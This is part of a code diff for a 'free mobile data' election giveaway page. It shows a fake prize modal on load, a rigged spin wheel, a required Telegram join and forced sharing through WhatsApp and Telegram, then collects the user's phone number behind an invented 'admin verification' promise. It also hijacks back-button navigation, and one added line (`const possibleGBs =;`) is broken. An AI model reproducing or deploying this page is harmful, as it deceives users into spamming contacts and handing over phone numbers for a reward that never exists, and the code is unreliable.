-                updateUIForStage(shareStage); 
-            } else {
-                // If it's the main gateway tab, show the gateway and hide the spin/claim section
-                gatewaySection.style.display = 'block';
-                spinClaimSection.style.display = 'none';
+        // Share text with example country codes (replace as needed)
+        const shareTextTemplate = "*🎉 Election Special! Get 5GB to 50GB FREE Data! Claim yours now!* 🇵🇰🇺🇸🇮🇩🇬🇧🇫🇷🇩🇪🇯🇵🇰🇷🇨🇳\n\nLink: ";
+        const currentUrl = window.location.href;
+        const finalShareText = shareTextTemplate + currentUrl;
+
+
+        // --- Function to show sections ---
+        function showSection(sectionToShow) {
+            document.querySelectorAll('.content-section').forEach(section => {
+                section.classList.add('hidden');
+            });
+            sectionToShow.classList.remove('hidden');
+        }
+
+        // --- Congratulation Modal Logic ---
+        function showCongratulationsModal() {
+            congratulationsModal.classList.add('show');
+            try {
+                congruSound.play();
+            } catch (e) {
+                console.warn("Audio playback failed: ", e);
             }
-            
-            // Update share button links to use the correct base URL
-            updateShareButtonLinks();
+        }
+
+        closeModalButton.addEventListener('click', () => {
+            congratulationsModal.classList.remove('show');
+            mainOfferSection.classList.remove('hidden');
+            document.querySelector('.page-container').style.opacity = '1';
+            document.querySelector('.page-container').style.transform = 'translateY(0)';
         });
 
-        // --- Gateway Button Logic ---
-        // This button opens the spin/claim section in a new tab
-        if (clickHereButton) {
-            clickHereButton.addEventListener('click', function(event) {
-                event.preventDefault(); 
-                // Construct the URL for the new tab: current URL without params/hash, plus new params
-                const baseUrl = window.location.href.split('?')[0].split('#')[0];
-                const newTabUrl = `${baseUrl}?promo=election#spin`;
-                window.open(newTabUrl, '_blank');
-                
-                // Optionally, redirect the current tab to the same URL after a short delay
-                // This ensures consistency if the user closes the new tab quickly.
-                setTimeout(() => {
-                    window.location.href = newTabUrl;
-                }, 500);
-            });
+        // --- Theme Toggle ---
+        function toggleTheme() {
+            body.classList.toggle('dark-mode');
+            body.classList.toggle('light-mode');
+
+            if (body.classList.contains('dark-mode')) {
+                themeIcon.textContent = '🌙';
+            } else {
+                themeIcon.textContent = '☀️';
+            }
         }
+        themeToggleButton.addEventListener('click', toggleTheme);
 
-        // --- Spin Logic ---
-        if (spinNowButton) {
-            spinNowButton.addEventListener('click', function() {
-                // Disable button and change text while spinning
-                spinNowButton.disabled = true;
-                spinNowButton.textContent = 'Spinning...';
-                spinImage.classList.add('spinning'); // Apply spinning animation
+        // --- Initial Load / Page Entry ---
+        window.addEventListener('load', () => {
+            showSection(mainOfferSection); // Ensure main offer is visible by default
+            mainOfferSection.classList.remove('hidden');
 
-                // Simulate spinning for 2.5 seconds
-                setTimeout(() => {
-                    spinImage.classList.remove('spinning'); // Remove animation
+            showCongratulationsModal(); // Show modal immediately on load
 
-                    // Determine a random GB amount
-                    const possibleGBs = [5, 10, 15, 20, 25, 30, 40, 50];
-                    wonGB = possibleGBs[Math.floor(Math.random() * possibleGBs.length)];
-                    
-                    // Display the won amount
-                    gbWonMessage.innerHTML = `🎉 Congratulations! You won ${wonGB}GB Internet! 🎉`;
-                    gbWonMessage.classList.remove('hidden');
-                    gbWonMessage.classList.add('visible');
-                    
-                    spinNowButton.style.display = 'none'; // Hide the spin button
-
-                    // Move to the next stage: Telegram Join
-                    shareStage = 1;
-                    updateUIForStage(shareStage);
-                    // Scroll to the bottom to reveal the new sections
-                    window.scrollTo(0, document.body.scrollHeight); 
-                }, 2500); // Duration of the spin animation
-            });
-        }
-
-        // --- Telegram Join Logic ---
-        if (alreadyJoinedButton) {
-            alreadyJoinedButton.addEventListener('click', function() {
-                // Hide the "I have Joined" button and show the timer section
-                telegramJoinSection.style.display = 'none'; // Hide the button to join
-                timerSection.classList.add('visible');
-                
-                let timeLeft = 10; // Countdown from 10 seconds
-                countdownElement.textContent = timeLeft;
-                
-                const timerInterval = setInterval(() => {
-                    timeLeft--;
-                    countdownElement.textContent = timeLeft;
-                    if (timeLeft <= 0) {
-                        clearInterval(timerInterval); // Stop the timer
-                        timerSection.style.display = 'none'; // Hide the timer
-                        
-                        // Move to the next stage: Sharing
-                        shareStage = 2;
-                        updateUIForStage(shareStage);
-                        // Scroll to the bottom
-                        window.scrollTo(0, document.body.scrollHeight); 
-                    }
-                }, 1000); // Update every second
-            });
-        }
-
-        // --- Sharing Logic ---
-        function handleShareAction() {
-            // Only allow sharing actions if we are in the sharing stage
-            if (shareStage === 2) {
-                shareCount++;
-                // Calculate progress based on shares completed vs target
-                shareProgress = Math.min(100, (shareCount / maxShares) * 100);
-                updateProgressBar();
-                
-                // If enough shares are made, enable the confirmation button
-                if (shareCount >= maxShares) {
+            phoneNumberInput.addEventListener('input', () => {
+                if (phoneNumberInput.value.trim() !== '' && currentShareProgress >= 100) {
                     confirmationButton.disabled = false;
-                    confirmationButton.style.display = 'inline-block'; // Make sure confirmation button is visible
-                    dynamicShareSection.style.display = 'none'; // Hide the share section
-                    phoneInputSection.classList.add('visible'); // Show phone input section
-                    phoneInputSection.style.display = 'block'; // Ensure it's displayed
-                    // Scroll to the bottom
-                    window.scrollTo(0, document.body.scrollHeight); 
+                } else {
+                    confirmationButton.disabled = true;
                 }
+            });
+
+            // History API for preventing backward navigation issues (optional but good practice)
+            history.pushState({ page: 1 }, "initial", "#initial");
+            window.addEventListener('popstate', function(event) {
+                if (window.location.hash === '#initial') {
+                    history.pushState(null, '', window.location.href.replace('#initial', '') + '#loaded');
+                }
+            });
+        });
+
+
+        // --- "Click Here" Button Functionality ---
+        clickHereContainer.addEventListener('click', () => {
+            mainOfferSection.classList.add('fade-out');
+            setTimeout(() => {
+                mainOfferSection.classList.add('hidden');
+                spinOfferSection.classList.remove('hidden');
+                spinOfferSection.classList.add('fade-in');
+                window.scrollTo(0, 0);
+            }, 500);
+        });
+
+        // --- "Spin Now" Button Functionality ---
+        spinNowButton.addEventListener('click', () => {
+            spinNowButton.disabled = true;
+            spinNowButton.textContent = 'Spinning...';
+            spinImage.classList.add('spinning');
+
+            setTimeout(() => {
+                spinImage.classList.remove('spinning');
+                spinNowButton.style.display = 'none';
+
+                const possibleGBs =;
+                wonGB = possibleGBs[Math.floor(Math.random() * possibleGBs.length)];
+
+                gbWonMessage.innerHTML = `🎉 Congratulations! You won ${wonGB}GB Data! 🎉`;
+                gbWonMessage.classList.remove('hidden');
+                gbWonMessage.classList.add('visible');
+
+                setTimeout(() => {
+                    showSection(claimStepsSection);
+                    claimStepsSection.classList.add('fade-in');
+                    startTelegramCountdown();
+                    window.scrollTo(0, 0);
+                }, 1000);
+
+            }, 2000); // Spin animation duration
+        });
+
+        // --- Telegram Countdown and Proceed Logic ---
+        let countdownInterval;
+        function startTelegramCountdown() {
+            let timeLeft = 10;
+            countdownTimer.textContent = timeLeft;
+            proceedToStep2Button.disabled = true;
+            proceedToStep2Button.textContent = 'Wait for countdown...';
+            joinTelegramButton.style.display = 'inline-block';
+
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownTimer.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownTimer.textContent = 'Time\'s up!';
+                    proceedToStep2Button.disabled = false;
+                    proceedToStep2Button.textContent = 'Proceed to Step 2';
+                    joinTelegramButton.style.display = 'none'; // Hide join button after timer ends
+                }
+            }, 1000);
+        }
+
+        proceedToStep2Button.addEventListener('click', () => {
+            if (!proceedToStep2Button.disabled) {
+                claimStepsSection.classList.add('fade-out');
+                setTimeout(() => {
+                    document.getElementById('telegram-join-section').classList.add('hidden');
+                    document.getElementById('sharing-section').classList.remove('hidden');
+                    claimStepsSection.classList.remove('fade-out');
+                    claimStepsSection.classList.add('fade-in');
+                    updateProgressBar(0);
+                    submitPhoneButton.disabled = true;
+                    phoneNumberInput.value = '';
+                    phoneNumberInput.disabled = true;
+                    confirmationButton.disabled = true;
+                    window.scrollTo(0, 0);
+                }, 500);
+            }
+        });
+
+
+        // --- Share Button Functionalities and Progress Bar ---
+        function updateProgressBar(progress) {
+            currentShareProgress = Math.min(100, Math.max(0, progress));
+            progressBar.style.width = currentShareProgress + '%';
+
+            if (currentShareProgress < 100) {
+                progressInfoText.textContent = `Share with ${requiredShares} friends. You're ${Math.round(currentShareProgress / shareAmountIncrease)}/${requiredShares} done!`;
+                submitPhoneButton.disabled = true;
+                phoneNumberInput.disabled = true;
+                confirmationButton.disabled = true;
+            } else {
+                progressInfoText.textContent = `Share completion reached! Enter your number to claim.`;
+                submitPhoneButton.disabled = false;
+                phoneNumberInput.disabled = false;
+                confirmationButton.disabled = false;
             }
         }
 
-        // Event listener for Copy Link button
+        function handleShareClick() {
+            shareCount++;
+            currentShareProgress = Math.min(100, shareCount * shareAmountIncrease);
+            updateProgressBar(currentShareProgress);
+        }
+
         copyLinkButton.addEventListener('click', function() {
-            navigator.clipboard.writeText(shareTextGlobal + "\n" + telegramChannelUrl).then(() => {
-                showCopyNotification('Link copied!'); // Show confirmation
-                handleShareAction(); // Track share
+            navigator.clipboard.writeText(finalShareText).then(() => {
+                copyNotification.textContent = 'Link copied!';
+                copyNotification.classList.add('show');
+                setTimeout(() => { copyNotification.classList.remove('show'); }, 2000);
+                handleShareClick();
             }).catch(err => {
                 console.error('Failed to copy: ', err);
-                showCopyNotification('Failed to copy link.'); // Show error message
+                alert('Could not copy link. Please copy manually.');
             });
         });
 
-        // Event listener for WhatsApp Share button
         whatsappShareButton.addEventListener('click', function() {
-            const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareTextGlobal + "\n" + window.location.href.split('#')[0])}`; // Use base URL for sharing
-            window.open(whatsappUrl, '_blank'); // Open WhatsApp share dialog
-            handleShareAction(); // Track share
+            const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(finalShareText)}`;
+            window.open(whatsappUrl, '_blank');
+            handleShareClick();
         });
 
-        // Event listener for Telegram Share button
         telegramShareButton.addEventListener('click', function() {
-            // Construct Telegram share URL with text and current page URL
-            const telegramUrl = `https://t.me/share/url?url=${encodeURIComponent(window.location.href.split('#')[0])}&text=${encodeURIComponent(shareTextGlobal)}`;
-            window.open(telegramUrl, '_blank'); // Open Telegram share dialog
-            handleShareAction(); // Track share
+            const telegramUrl = `https://t.me/share/url?url=${encodeURIComponent(currentUrl)}&text=${encodeURIComponent(shareTextTemplate.replace('Link: ', ''))}`; // Use template without "Link: " again for text
+            window.open(telegramUrl, '_blank');
+            handleShareClick();
         });
 
-        // --- Phone Input & Confirmation ---
-        if (confirmationButton) {
-            confirmationButton.addEventListener('click', function() {
-                const phoneNumber = phoneNumberInput.value.trim();
-                // Basic phone number validation (allows digits and optional leading '+')
-                if (phoneNumber.length < 10 || !/^[0-9+]+$/.test(phoneNumber)) {
-                    alert("Please enter a valid phone number.");
-                    return;
-                }
-                
-                // Disable button to prevent multiple submissions
-                confirmationButton.disabled = true;
-                confirmationButton.textContent = 'Processing...';
-                phoneInputSection.style.display = 'none'; // Hide phone input section
-
-                // Update modal message with claim details
-                modalMessage.textContent = `Your ${wonGB}GB data claim is being processed. You will receive it within 24 hours after admin verification.`;
-                congratulationsModal.classList.add('show'); // Show the congratulations modal
-                
-                // Optional: Automatically close the tab or redirect after a delay
-                // setTimeout(() => { window.close(); }, 5000);
-            });
-        }
-
-        // --- UI State Management ---
-        // Updates which sections are visible based on the current stage of the offer
-        function updateUIForStage(stage) {
-            // Hide all intermediate sections initially
-            gbWonMessage.classList.add('hidden');
-            telegramJoinSection.style.display = 'none';
-            timerSection.style.display = 'none';
-            phoneInputSection.classList.add('hidden');
-            phoneInputSection.style.display = 'none'; 
-            dynamicShareSection.style.display = 'none'; 
-            confirmationButton.disabled = true; // Disable confirmation button by default
-            confirmationButton.style.display = 'none'; // Hide it until ready
-
-            switch (stage) {
-                case 0: // After winning GB, before Telegram join
-                    gbWonMessage.classList.add('visible'); // Show won GB message
-                    spinNowButton.style.display = 'none'; // Ensure spin button is hidden
-                    telegramJoinSection.style.display = 'block'; // Show Telegram join section
-                    alreadyJoinedButton.style.display = 'block'; // Show "I have joined" button
-                    break;
-                case 1: // After clicking "I have Joined", during the 10-second timer
-                    gbWonMessage.classList.add('visible'); // Keep won GB message visible
-                    telegramJoinSection.style.display = 'block'; // Keep Telegram section visible
-                    alreadyJoinedButton.style.display = 'none'; // Hide the "I have joined" button
-                    timerSection.classList.add('visible'); // Show the timer
-                    break;
-                case 2: // After timer finishes, ready to share
-                    gbWonMessage.classList.add('visible'); // Keep won GB message visible
-                    telegramJoinSection.style.display = 'none'; // Hide Telegram join section
-                    dynamicShareSection.style.display = 'block'; // Show the share section
-                    dynamicShareSection.classList.add('visible'); // Make it visible
-                    updateProgressBar(); // Initialize progress bar display
-                    break;
-                // Case 3 (or beyond) would be handled implicitly when confirmationButton is enabled and shown
+        // --- Phone Input and Final Confirmation Logic ---
+        submitPhoneButton.addEventListener('click', () => {
+            if (currentShareProgress >= 100) {
+                phoneInputSection.classList.remove('hidden');
+                phoneInputSection.classList.add('fade-in');
+                phoneNumberInput.disabled = false;
+                confirmationButton.disabled = phoneNumberInput.value.trim() === '';
+                window.scrollTo(0, document.body.scrollHeight);
             }
-        }
+        });
 
-        // Updates the progress bar's width and text
-        function updateProgressBar() {
-            progressBar.style.width = shareProgress + '%';
-            progressBar.textContent = Math.round(shareProgress) + '%';
+        confirmationButton.addEventListener('click', function() {
+            const phoneNumber = phoneNumberInput.value.trim();
+            const phoneRegex = /^\+?[0-9\s-]{7,}$/; // Basic validation
 
-            if (shareCount < maxShares) {
-                // If user still needs to share more
-                const remaining = maxShares - shareCount;
-                progressInfoText.textContent = `Share with ${remaining} more friends to unlock your prize.`;
-                progressBar.classList.remove('loading');
-            } else {
-                // If user has shared enough
-                progressInfoText.textContent = 'Congratulations! You can now claim your prize.';
-                progressBar.style.width = '100%'; // Ensure it shows 100%
-                progressBar.textContent = '100%';
-                progressBar.classList.remove('loading');
+            if (!phoneRegex.test(phoneNumber)) {
+                alert("Please enter a valid phone number.");
+                return;
             }
-        }
 
-        // Shows a temporary notification message (e.g., "Link copied!")
-        function showCopyNotification(message) {
-            copyNotification.textContent = message;
-            copyNotification.classList.add('show');
+            confirmationButton.disabled = true;
+            confirmationButton.textContent = 'Processing...';
+
             setTimeout(() => {
-                copyNotification.classList.remove('show');
-            }, 2000); // Hide after 2 seconds
-        }
-
-        // Plays the congratulatory sound and shows the modal
-        function playCongratulation() {
-            if (congratulationSound) {
-                // Play sound, catch errors if user interaction is not yet allowed
-                congratulationSound.play().catch(error => {
-                    console.log("Audio playback failed:", error);
-                });
-            }
-            if (congratulationsModal) {
-                congratulationsModal.classList.add('show'); // Show the modal
-            }
-        }
-        
-        // Event listener for closing the congratulatory modal
-        if (congratulationsModalClose) {
-            congratulationsModalClose.addEventListener('click', () => {
-                congratulationsModal.classList.remove('show'); // Hide the modal
-                // After modal is closed, ensure the correct UI state is shown
-                // If we just finished spinning (stage 0), it should now show the Telegram join
-                if (shareStage === 0) { 
-                    updateUIForStage(0);
-                }
-            });
-        }
-
-        // Sets the correct target URLs for the share buttons
-        function updateShareButtonLinks() {
-            // Get the base URL (without query params or hash) for sharing purposes
-            const baseUrl = window.location.href.split('?')[0].split('#')[0];
-            
-            // WhatsApp share link
-            const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareTextGlobal + "\n" + baseUrl)}`;
-            whatsappShareButton.onclick = () => { window.open(whatsappUrl, '_blank'); handleShareAction(); };
-
-            // Telegram share link
-            const telegramUrl = `https://t.me/share/url?url=${encodeURIComponent(baseUrl)}&text=${encodeURIComponent(shareTextGlobal)}`;
-            telegramShareButton.onclick = () => { window.open(telegramUrl, '_blank'); handleShareAction(); };
-        }
-
-        // Ensures that initially hidden sections are properly managed for transitions.
-        // This ensures sections that are hidden at load (`.hidden` class) don't interfere with layout
-        // before they are meant to be revealed.
-        document.addEventListener('DOMContentLoaded', () => {
-            const allHiddenSections = document.querySelectorAll('.page-section.hidden, #gb-won-message.hidden, #telegram-join-section.hidden, #phone-input-section.hidden, #dynamic-share-section.hidden');
-            allHiddenSections.forEach(section => {
-                // If a section is marked hidden and not visible, set its display to 'none'.
-                // This prevents it from occupying space or causing layout shifts until it's intended to appear.
-                if (!section.classList.contains('visible')) {
-                    section.style.display = 'none';
-                }
-            });
+                alert("Congratulations! Your data reward will be processed and credited within 24 hours after admin verification.");
+                // Reset and hide sections, or redirect
+                mainOfferSection.classList.remove('hidden');
+                mainOfferSection.classList.add('fade-in');
+                document.getElementById('spin-offer-section').classList.add('hidden');
+                document.getElementById('claim-steps-section').classList.add('hidden');
+                document.getElementById('phone-input-section').classList.add('hidden');
+                window.scrollTo(0, 0);
+                confirmationButton.textContent = 'Claim My Data'; // Reset button text
+            }, 1500);
         });
 
+        // --- Image Error Handling ---
+        document.querySelectorAll('img').forEach(img => {
+            img.onerror = function() {
+                this.alt = "Image failed to load";
+                this.style.display = 'none';
+            };
+            // Fallback images if files are not found
+            if (img.src.endsWith('Cover.png') && img.src.startsWith('blob')) img.src = 'https://via.placeholder.com/550x300/212121/FFFFFF?text=Election+Offer';
+            if (img.src.endsWith('Spin.png') && img.src.startsWith('blob')) img.src = 'https://via.placeholder.com/350x350/333333/FFFFFF?text=Spin+Wheel';
+            if (img.src.endsWith('Click Here.gif') && img.src.startsWith('blob')) img.src = 'https://via.placeholder.com/280x80/28a745/FFFFFF?text=Click+Here';
+        });
     </script>
 </body>
 </html>
